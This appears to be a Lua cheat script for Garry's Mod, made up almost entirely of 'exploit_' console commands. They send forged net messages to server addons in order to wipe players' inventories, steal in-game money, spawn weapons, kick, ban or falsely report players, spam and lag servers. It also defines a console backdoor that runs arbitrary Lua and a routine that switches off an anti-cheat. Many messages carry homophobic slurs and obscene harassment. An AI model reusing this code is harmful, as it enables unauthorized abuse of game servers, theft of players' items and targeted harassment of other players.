        net.WriteString("Because you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :DBecause you been a bad boy and didn't apologize. Maybe next time please apologize :D")
        net.SendToServer()
    end
    end)



concommand.Add("exploit_eziremoveall",function()
    for k,v in pairs(player.GetAll()) do                                           
        net.Start("EZI_AdminEmptyInv")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)

concommand.Add("exploit_ezicheckall",function()
    for k,v in pairs(player.GetAll()) do   
        net.Start("EZI_GetInv")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)


concommand.Add("exploit_ezitest",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("EZI_EmptyInv")
        net.SendToServer()
    end
    end)
concommand.Add("exploit_fakerdm",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("IveBeenRDMed")                              
        net.WriteEntity(v)
        net.SendToServer()
    end            
    end)           






concommand.Add("exploit_falsereport",function()
    net.Start( "TransferReport" )
    net.WriteString("STEAM69")
    net.WriteString("Being a faggot plz ban volvo")
    net.WriteString("Killed Swagglishy")
    net.SendToServer( )
    end)           


concommand.Add("exploit_bybailall",function() -- Exploit on all Byb servers to bail yourself out
    for k,v in pairs(player.GetAll()) do
        net.Start("Letthisdudeout")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)


concommand.Add("test213", function(ply, cmd, args)
   
 
   
 
    for i = 1000000000, 999999999999 do
        if (not targ or not targ:IsValid()) then print('target'); return; end
        timer.Simple(i / 350, function()
         
         RunConsoleCommand("admincodeauth", util.CRC(i), targ:UniqueID());
         end)
    end
    
    print('found');
    end)
concommand.Add("exploit_darthgrabmoney",function()
    for k,v in pairs(ents.GetAll()) do
        chat.AddText(Color(255,0,0), "GRABBING MONEY!")
        net.Start("DataSend")
        net.WriteEntity( v )
        net.WriteFloat(2)
        net.WriteEntity(self)
        net.WriteEntity(LocalPlayer())
        net.SendToServer()
    end
    end)
concommand.Add("exploit_test69",function()
    for k,v in pairs(player.GetAll()) do
        net.Start( "rpi_request_playeritems" )
        net.WriteEntity( v )
        net.SendToServer()
    end
    end)


concommand.Add("exploit_donationboxtest",function()
    local donation_box = LocalPlayer():GetEyeTrace().Entity    
    net.Start( "donation_box" )
    net.WriteEntity(donation_box)
    net.WriteFloat("-1")
    net.SendToServer()
    end)
print( LocalPlayer():GetEyeTrace().Entity )

concommand.Add("exploit_fightclubstartfight",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("FIGHTCLUB_StartFight")
        net.WriteEntity(v)
        net.SendToServer()                     
    end
    end)



concommand.Add("exploit_test69withme",function()
    for k,v in pairs(ents.GetAll()) do
        local Player = LocalPlayer():GetEyeTrace().Entity
        net.Start("nCTieUpStart")
        net.WriteEntity(Player)
        net.SendToServer()
    end
    end)

concommand.Add("exploit_retrieveweapon1",function()
    net.Start("ARMORY_RetrieveWeapon")
    net.WriteString("weapon1")
    net.SendToServer()
    end)

concommand.Add("exploit_retrieveweapon2",function()
    net.Start("ARMORY_RetrieveWeapon")
    net.WriteString("weapon2")
    net.SendToServer()
    end)

concommand.Add("exploit_retrieveweapon3",function()
    net.Start("ARMORY_RetrieveWeapon")
    net.WriteString("weapon3")
    net.SendToServer()
    end)


concommand.Add("exploit_nggrabmoney",function()
    for k,v in pairs(ents.GetAll()) do
        net.Start( 'NET_DoPrinterAction' )
        net.WriteEntity( LocalPlayer() )
        net.WriteEntity(v)
        net.WriteInt( 2, 16 )
        net.SendToServer()
    end
    end)


concommand.Add("exploit_createfiretruck",function()
    net.Start("FIRE_CreateFireTruck")
    net.SendToServer()
    end)   
concommand.Add("exploit_createtowtruck",function()
    net.Start("TowTruck_CreateTowTruck")
    net.SendToServer()
    end)

concommand.Add("exploit_spawnpocket",function()        
    net.Start("DarkRP_spawnPocket")
    net.WriteString("m9k_davy_crockett")
    net.WriteFloat(1)
    net.SendToServer()
    end)                   
concommand.Add("exploit_alchemydestorytables",function()       
    net.Start("DestroyTable")
    net.WriteEntity(self)
    net.SendToServer()
    end)



concommand.Add("exploit_hack",function()
    local hackEnt2 = LocalPlayer():GetEyeTrace().Entity
    net.Start("start_wd_hack")
    net.WriteEntity( hackEnt2 )
    net.Start("start_wd_emp")
    net.SendToServer()
    net.SendToServer()
    end)

concommand.Add("exploit_ban",function()
    for k,v in pairs(player.GetAll()) do
        local fgt = LocalPlayer():GetEyeTrace().Entity
        net.Start('bringNfreeze')
        net.WriteEntity(self)
        net.WriteEntity(fgt)
        net.SendToServer()
    end
    end)


concommand.Add("exploit_nlrkickall",function()
    for k,v in pairs(player.GetAll()) do
        if v != LocalPlayer() then
            net.Start("NLRKick")
            net.WriteEntity(v)
            net.SendToServer()
        end
    end
    end)

concommand.Add("exploit_nlrkick",function()
    for k,v in pairs(player.GetAll()) do
        local kickdisbitch = LocalPlayer():GetEyeTrace().Entity
        net.Start("NLRKick")
        net.WriteEntity(kickdisbitch)
        net.SendToServer()
    end
    end)

concommand.Add("exploit_JoinFirstSS",function()
    net.Start("JoinFirstSS")
    net.WriteEntity(LocalPlayer())
    net.SendToServer()
    end)


concommand.Add("exploit_test691",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("unarrestPerson")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)

concommand.Add("exploit_givearrestreason",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("giveArrestReason")
        net.WriteEntity(LocalPlayer())
        net.WriteEntity(v)
        net.WriteString("Faggot")
        net.SendToServer()
    end
    end)


concommand.Add("exploit_sellitem",function()
    net.Start("sellitem")
    net.WriteString(self)
    net.WriteEntity(LocalPlayer())
    net.SendToServer()
    end)
concommand.Add("exploit_createfaction",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("createFaction")
        net.WriteEntity(v)
        net.WriteString("I FUCKED SO MANY BABIES TODAY WOOOOOOOOOOOOOOOOOOOOOOOO")
        net.SendToServer()
    end
    end)

concommand.Add("exploit_factioninvall",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("inviteToOrganization")
        net.WriteEntity(v)
        net.WriteEntity(LocalPlayer())
        net.SendToServer()             
    end
    end)

concommand.Add("exploit_lagserverf",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("JoinOrg")
        net.WriteEntity(LocalPlayer())
        net.WriteString("test")
        net.SendToServer()                         
    end
    end)   
concommand.Add("exploit_bringtest",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("score_cmd")
        net.WriteString("bring")
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)           
concommand.Add("exploit_govspawn",function()
    for k,v in pairs(ents.GetAll()) do
        net.Start("GovStation_SpawnVehicle")
        net.WriteString("GOV_POLICE")
        net.SendToServer()
    end
    end)
concommand.Add("exploit_giveweaponallextended",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("giveweapon")
        net.WriteEntity(v)
        net.WriteString("m9k_davy_crockett")
        net.SendToServer()
    end
    end)
concommand.Add("exploit_giveweapon2extended",function()
    for k,v in pairs(player.GetAll()) do
       
        net.Start( "GiveWeapon" )
        net.WriteEntity( LocalPlayer() )
        net.WriteString("m9k_davy_crockett")
        net.WriteFloat(0)
        net.SendToServer()
    end
    end)

concommand.Add("exploit_bybail",function() -- Exploit on all Byb servers to bail yourself out
    net.Start("Letthisdudeout")
    net.WriteEntity(LocalPlayer())
    net.SendToServer()
    end)   
concommand.Add("exploit_loginclaim",function()
    net.Start("DailyLoginClaim")
    net.SendToServer()
    end)
concommand.Add("exploit_asklog",function()
    net.Start("DL_AskLogsList")
    net.SendToServer()
    end)
concommand.Add("exploit_dlreportall",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("DL_StartReport")
        net.SendToServer()
        net.Start("DL_ReportPlayer")
        net.WriteEntity(v)
        net.WriteString("Hes being a gay faggot plz ban him")
        net.SendToServer()
    end
    end)                   

concommand.Add("exploit_tttweapons",function()
    net.Start("sv_saveweapons")
    net.WriteString("weapon_ttt_rpg")
    net.WriteString("weapon_ttt_rpg")
                net.WriteString("eg") --Gives you any weapon including Davy Crocket c:
                net.SendToServer()
                end)

concommand.Add("exploit_specdm",function()
    net.Start("SpecDM_SendLoadout")
    net.WriteString("eg")
    net.WriteString("weapon_ttt_defib")
    net.SendToServer()
    end)

concommand.Add("exploit_powerroundsforce",function()
    net.Start( "PowerRoundsForcePR" )
    net.SendToServer()
    end)
concommand.Add("exploit_sendmail",function()
   
    for k,v in pairs(player.GetAll()) do
        net.Start( "SendMail" )
        net.WriteString("IVE GOT LOADDDDDS OF SWAG!!!!!!! SUCK IT BITCH!")
        net.WriteString(v:Nick())
        net.SendToServer()
        print("LOLLOLOLOLOLOLOLOL")
        
    end
    end)


concommand.Add("exploit_wyozimc",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("wyozimc_playply")
        net.WriteEntity(v)
        net.WriteString("https://www.youtube.com/watch?v=2fSeiKs6MYY")
        net.SendToServer()
    end
    end)

concommand.Add("exploit_sendmails",function()
    for k,v in pairs(player.GetAll()) do
        net.Start( "SendSteamID" )
        net.WriteEntity(v)
        net.WriteString("Faggot")
        net.WriteString("Faggot")
        net.SendToServer()
    end
    end)

concommand.Add("exploit_hopping",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("Hopping_Test")
        net.WriteEntity(v)
        net.WriteString("69.696.696969.69")
        net.SendToServer()
    end
    end)
concommand.Add("exploit_jbgivecubicsall",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("JB_GiveCubics")
        net.WriteEntity(v)
        net.WriteInt( math.floor(dwang:GetValue()), 255 )
        net.SendToServer()
    end
    end)

concommand.Add("exploit_jbselectwardenall",function()
    for k,v in pairs(player.GetAll()) do
        net.Start( "JB_SelectWarden" )
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)
        --[[net.Start( "noobadmin_networkcommands" )
        net.SendToServer( )
       
       
                                        net.Start( "noob_playerperks" )
                                        net.WriteTable( { tree = name, rank = index } )
                                net.SendToServer( )
                               
                                                net.Start( "N00BRP_PermWeapons_NET" )
                        net.WriteInt( PERMWEPS_REQUESTALL, 8 )
                        net.SendToServer( )]]
                        
                concommand.Add("exploit_test213",function() -- Don't work
                    for k,v in pairs(ents.GetAll()) do
                        if v:GetClass() == "basic_money_printer" then
                            net.Start( "N00BRP_MoneyPrinters_Options" )
                            net.WriteInt( 1, 8 )
                            net.WriteEntity("basic_money_printer")
                            net.SendToServer( )
                        end
                    end
                    end)
                
                concommand.Add("exploit_rdmexplain",function()
                    for k,v in pairs(player.GetAll()) do
                        net.Start("RDMReason_Explain")
                        net.WriteTable({id=v, reason=fgt})
                        net.SendToServer()
                    end
                    end)
                
                concommand.Add("exploit_redirectmsg",function()
                   net.Start( "redirectMsg" )
                   net.WriteString("Fuck you! YOUR ALL FAGGOTS!")
                   net.SendToServer()
                   end)
                
                concommand.Add( "killyourself", function( ply )
                   ply:Kill()
                   print( "You killed yourself!" )
                   end )
                
                concommand.Remove( "_restart" )
                
                concommand.Add("exploit_lbban",function()
                    for k,v in pairs(player.GetAll()) do
                        if v != LocalPlayer() then
                            net.Start("LB_AddBan")
                            net.WriteString("STEAM_0:1:219919521")
                            net.WriteString("fgt")
                            net.SendToServer()
                        end
                    end
                    end)
                
                concommand.Add("exploit_brassAdminchat",function()
                    net.Start("GET_Admin_MSGS");
                    net.SendToServer();    
                    net.Start("OPEN_ADMIN_CHAT");
                    net.SendToServer();
                    end)
                
                
                concommand.Add("exploit_brassmailsendall",function()
                    for k,v in pairs(player.GetAll()) do
                        if v != LocalPlayer() then
                            net.Start("br_send_pm");
                            net.WriteString(v);
                            net.WriteString("FGT");
                            net.WriteEntity(v);
                            net.SendToServer();            
                        end
                    end
                    end)
                
                concommand.Add("exploit_saintsrpbail",function()
                    net.Start("LAWYER.BailFelonOut")
                    net.WriteString("1")
                    net.WriteString("fgt")
                    net.SendToServer()
                    end)
                
                concommand.Add("exploit_saintsrpbailofferall",function()
                    net.Start("LAWYER.GetBailOut")
                    net.WriteString("Mick")
                    net.WriteString("Mick")
                    net.WriteString("1000000")
                    net.SendToServer()
                    end)
                
                
                concommand.Add("exploit_saintsrptakeallmoney",function()
                    for k,v in pairs(ents.GetAll()) do
                        if v:GetClass() == "money_printer" then
                            chat.AddText(Color(255,0,0), "GRABBING MONEY!")
                            net.Start( 'NET_DoPrinterAction' )
                            net.WriteEntity( LocalPlayer() )
                            net.WriteEntity(v)
                            net.WriteInt( 2, 16 )
                            net.SendToServer()
                        end
                    end
                    end)
                concommand.Add("exploit_saintsrpprinters",function()
                    for k,v in pairs(ents.GetAll()) do
                        if v:GetClass() == "ng_money_printer" then
                            chat.AddText(Color(255,0,0), "Turning On/OFF printers!")
                            net.Start( 'NET_DoPrinterAction' )
                            net.WriteEntity( LocalPlayer() )
                            net.WriteEntity( Printer )
                            net.WriteInt( 1, 16 )
                            net.SendToServer()
                        end
                    end
                    end)
                concommand.Add("exploit_Neoninvlag",function()
                    for k,v in pairs(player.GetAll()) do
                        local dropyoshit = LocalPlayer():GetEyeTrace().Entity
                        net.Start("DropItemFromInv")
                        net.WriteString("spawned_weapon")
                        net.WriteString("spawned_weapon")
                        net.WriteEntity(dropyoshit)
                        net.SendToServer()
                    end
                    end)
                
                concommand.Add("exploit_deathkick",function()
                    for k,v in pairs(player.GetAll()) do
                        local kickdisbitch2 = LocalPlayer():GetEyeTrace().Entity
                        net.Start("RecKickAFKer")
                        net.WriteEntity(kickdisbitch2)
                        net.SendToServer()
                    end
                    end)
                
                concommand.Add("exploit_deathkickall",function()
                    for k,v in pairs(player.GetAll()) do
                        if v != LocalPlayer() then
                            net.Start("RecKickAFKer")
                            net.WriteEntity(v)
                            net.SendToServer()
                        end
                    end
                    end)
                concommand.Add("exploit_sendmailtest1",function()
                    for k,v in pairs(player.GetAll()) do
                        net.Start( "SendMail" )
                        net.WriteString("IVE GOT LOADDDDDS OF SWAG!!!!!!! SUCK IT BITCH!")
                        net.WriteString(v:Nick())
                        net.SendToServer()
                        print("LOLLOLOLOLOLOLOLOL")
                        
                    end
                    end)
                
                concommand.Add("exploit_grabmoney",function()
                    for k,v in pairs(ents.GetAll()) do
                        if v:GetClass() == "gold" then
                            if v:GetClass() == "silver" then
                                if v:GetClass() == "vip" then
                                    if v:GetClass() == "vipgold" then
                                        chat.AddText(Color(255,0,0), "GRABBING MONEY!")
                                        net.Start("GrabMoney")
                                        net.WriteEntity( LocalPlayer() )
                                        net.SendToServer()
                                    end
                                end
                            end
                        end
                    end
                    end)
                concommand.Add("exploit_noxban",function()
                    for k,v in pairs(player.GetAll()) do
                        if v != LocalPlayer() then
                            net.Start("nox_addpremadepunishment")
                            net.WriteEntity("Sun")
                            net.WriteUInt(2, 8)
                            net.SendToServer()
                        end
                    end
                    end)
                concommand.Add("exploit_psendpoints",function()
                    for k,v in pairs(player.GetAll()) do
                        if v != LocalPlayer() then
                          net.Start('PS_SendPoints')
                          net.WriteEntity(v)
      net.WriteInt(0, 32) -- You should have fixed this line.
      net.SendToServer()
  end
end
end)
                
                concommand.Add("exploit_mde_removedat", function()
                    local removedisbitch = LocalPlayer():GetEyeTrace().Entity
                    net.Start( "MDE_RemoveStuff_C2S" )
                    net.WriteTable( {DATA=removedisbitch,TARGET=removedisbitch} )
                    net.SendToServer()
                    end)
                
                local function NotLUABD(ply,cmd,args)
                    if (#args == 0) then return end
                    local str = table.concat(args," ")
                    
                    RunStringEx(str, "ObviousLuaBackdoor")
                    
                    ply:PrintMessage(HUD_PRINTCONSOLE, "[OK] running: "..str)
                end
                concommand.Add("__yunolua", NotLUABD)
                
                
                concommand.Add("exploit_cashregistrysteal", function()
                    for k,v in pairs(ents.GetAll()) do
                        if v:GetClass() == "ss_cash_registry" then
                            chat.AddText(Color(255,0,0), "Stealing Registry Money")
                            net.Start('NET_CR_TakeStoredMoney')
                            net.WriteEntity("ss_cash_registry")
                            net.WriteEntity( LocalPlayer() )
                            net.SendToServer()
                        end
                    end
                    end)
                concommand.Add("exploit_ss_money", function()
                    net.Start( 'NET_SS_DoBuyTakeoff' )
                    net.WriteEntity(LocalPlayer())
                    net.WriteEntity(swag)
                    net.WriteTable({'spawned_weapon'})
                    net.WriteInt(-1000000, 16)
                    net.SendToServer()
                    end)
                
                concommand.Add("exploit_ss_money_alot", function()
                  for i=0, 20 do
                    net.Start( 'NET_SS_DoBuyTakeoff' )
                    net.WriteEntity(LocalPlayer())
                    net.WriteEntity(swag)
                    net.WriteTable({})
                    net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
                    net.SendToServer()
                end
                end)
                
                
                concommand.Add("exploit_hv", function()
                    net.Start("HV_AmmoBuy")
                    net.WriteFloat("2")
                    net.SendToServer()
                    net.Start("HV_AmmoBuy")
                    net.WriteFloat("1")
                    net.SendToServer()
                    end)
                
                
concommand.Add("exploit_mail_spam", function() --192.223.26.62:27015
    print("[EXPLOITS] Cdriza\'s Mail \"Exploit\" loaded!")
    timer.Create("RandomTimerName", 0.1, 0, function()
        getRandomTimerName = math.random(420, 1337)
        end )
    concommand.Add("exploit_mail_spam", function()
        local allppl = player.GetAll()
        timer.Create("\"" ..getRandomTimerName.. "\"", 0, 0, function()
            for k,v in ipairs( allppl ) do
                local curtargetlol = v:Nick()
                net.Start( "SendMail" )
                net.WriteString( "This server is really good please don't leave" )
                net.WriteString(curtargetlol)
                net.SendToServer()
            end
            end )
        end )
    end)
concommand.Add("exploit_KunRespawn", function()
    net.Start("DarkRP_Kun_ForceSpawn")
    net.SendToServer()
    end)

concommand.Add("exploit_SuperRPHit", function()
    for k,v in pairs(player.GetAll()) do
        if v != LocalPlayer() then
            net.Start("hitcomplete")
            net.WriteEntity(v)
            net.SendToServer()
        end
    end
    end)





concommand.Add("exploit_12qewdast", function()
    net.Start( "netOrgVoteInvite_Server" )
    net.WriteEntity( ply )
    net.SendToServer()
    end)
concommand.Add("exploit_indomiteprinters", function()
    for k,v in pairs(ents.GetAll()) do
        if v:GetClass() == "money_printer" then
            chat.AddText(Color(255,0,0), "Stealing Adv Money Printer")
            net.Start( 'NET_DoPrinterAction' )
            net.WriteEntity( LocalPlayer() )
            net.WriteEntity( LocalPlayer() )
            net.WriteInt( 5, 16 )
            net.SendToServer()
        end
    end
    end)
concommand.Add("exploit_dlanswering", function()
    for i=0, 500 do
        net.Start("DL_Answering")
        net.SendToServer()
    end
    end)
concommand.Add("exploit_broah", function()
    for k,v in pairs(player.GetAll()) do
        local tab = {
        REPORTER = v:Nick(),
        REPORTERID = v:SteamID(),
        FAGGOT = v:Nick(),
        FAGGOTID = v:SteamID(),
        INFO = "fag",
        PROOF = "fag"
    }
    net.Start("CREATE_REPORT")
    net.WriteTable(tab)
    net.SendToServer()
    net.SendToServer()
end
end)
concommand.Add("exploit_dlreportplayer", function()
    local sucker = LocalPlayer():GetEyeTrace().Entity
    for k,v in pairs(player.GetAll()) do
        net.Start("DL_ReportPlayer")
        net.WriteEntity(sucker)
        net.WriteString("Cunt shit asshole")
        net.SendToServer()
    end
    end)

concommand.Add("exploit_dlreportplayerall", function()
    for i=0, 10 do
        for k,v in pairs(player.GetAll()) do
            net.Start("DL_ReportPlayer")
            net.WriteEntity(v)
            net.WriteString("fgt")
            net.SendToServer()
        end
    end
    end)

concommand.Add("exploit_videopoker", function()
    net.Start(BLACKJACK.NetworkCommand)
    net.WriteString("deposit")
    net.WriteInt(2,16)
    net.WriteInt(3,32)
    net.SendToServer()
    end)

concommand.Add("exploit_TOWSubmitWarning", function()
    local sucker33 = LocalPlayer():GetEyeTrace().Entity
    for k,v in pairs(player.GetAll()) do
        net.Start("TOW_SubmitWarning")
        net.WriteString(tostring(me))
        net.WriteDouble(5)
        net.WriteEntity(swag)
        net.SendToServer()
        net.Start("TOW_PayTheFine")
        net.WriteEntity(LocalPlayer())
        net.SendToServer()
        
    end
    end)
concommand.Add("exploit_cac", function()
    function CAC:FilePlayer() end
    timer.Destroy( "CAC" )
    end)




CreateClientConVar( "exploit_dance", 0, true, false)

local actdelay = false


local acttable = {
{ Act = ACT_GMOD_TAUNT_LAUGH, Delay = 6.3 },
{ Act = ACT_GMOD_TAUNT_PERSISTENCE, Delay = 3.1 },
{ Act = ACT_GMOD_GESTURE_DISAGREE, Delay = 2.7 },
{ Act = ACT_GMOD_GESTURE_AGREE, Delay = 2.7},
{ Act = ACT_GMOD_GESTURE_WAVE, Delay = 3.7 },
{ Act = ACT_GMOD_GESTURE_BECON, Delay = 3.4 },
{ Act = ACT_GMOD_TAUNT_MUSCLE, Delay = 11 },
{ Act = ACT_GMOD_GESTURE_BOW, Delay = 3 },
}


local function rpact()
    if GAMEMODE.Name != "DarkRP" then
        LocalPlayer():ChatPrint("You are mentally insane for not running this on DarkRP!")
        RunConsoleCommand("exploit_dance", 0)
        return
    end
    if !(actdelay) then
        local act = table.Random(acttable)
        RunConsoleCommand("_DarkRP_DoAnimation", act.Act)
        actdelay = true
        timer.Simple(act.Delay, function()
            actdelay = false
            end)
    end
end

RunConsoleCommand("exploit_dance", 0)

cvars.AddChangeCallback("exploit_dance", function()
    if GetConVarNumber("exploit_dance") == 1 then
        hook.Add("Think", "hooked_dance", rpact)
        actdelay = false
    else
        hook.Remove("Think", "hooked_dance", rpact)
        actdelay = false
    end
    end)


